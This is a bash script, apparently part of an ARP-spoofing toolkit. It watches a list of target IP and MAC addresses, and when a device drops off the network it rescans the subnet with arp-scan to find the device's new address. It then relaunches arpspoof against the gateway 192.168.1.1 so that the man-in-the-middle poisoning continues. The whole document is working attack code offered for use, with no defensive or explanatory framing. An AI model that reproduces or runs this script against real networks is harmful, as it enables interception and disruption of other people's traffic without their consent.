subnet=$(ip -d route | grep $1 | grep / | awk {'print $2 '})
while true ; do
   if [[ -f macs.txt ]] ; then rm -rf macs.txt ; fi
   cat ips_macs.txt | awk 'NF' | while read i ; do
         ip=$(  echo $i | awk {' print $1 '})
         mac=$( echo $i | awk {' print $2 '})
         ping -c 1 $ip > ip_status.txt
         if [[ $( cat ip_status.txt ) =~ "Unreachable" ]] || [[ $( cat ip_status.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_status.txt ) =~ '0 received' ]] ; then
            echo "█ [ $ip : $mac ] has been disconnected"
            echo $mac >> macs.txt
            kill $( ps aux | grep $ip | grep xterm | awk {' print $2 '}) 2> /dev/null
         fi
   done
   sleep 5
   if [[ -f macs.txt ]] ; then
      for i in $( cat macs.txt ) ; do
         arp-scan $subnet 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} | grep $i > ips_macs.txt
         if [[ $( cat ips_macs.txt | grep $i ) == "" ]] ; then
            echo "█ Couldn't find $mac IP address"
            echo "█ Waiting 20 secounds before rescan the entire network"
            sleep 20
            arp-scan $subnet 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} | grep $i > ips_macs.txt
            if [[ $( cat ips_macs.txt | grep $i ) =~ "$i" ]] ; then
               echo -e "█ $i found at $( cat ips_macs.txt | grep $i | awk {' print $1 '}) address"
               echo "█ respoofing ARP ..."
               ipp=$( cat ips_macs.txt | grep $i | awk {' print $1 '} )
               xterm -geometry 90x20-20-400  -fg red -e bash -c "arpspoof -i wlan0 -t 192.168.1.1 $ipp" &
            fi
         elif [[ $( cat ips_macs.txt | grep $i ) =~ "$i" ]] ; then
            echo -e "█ $i found at $( cat ips_macs.txt | grep $i | awk {' print $1 '}) address"
            echo "█ respoofing ARP ..."
            ipp=$( cat ips_macs.txt | grep $i | awk {' print $1 '} )
            xterm -geometry 90x20-20-400  -fg red -e bash -c "arpspoof -i wlan0 -t 192.168.1.1 $ipp" &
         fi
      done
   fi
done

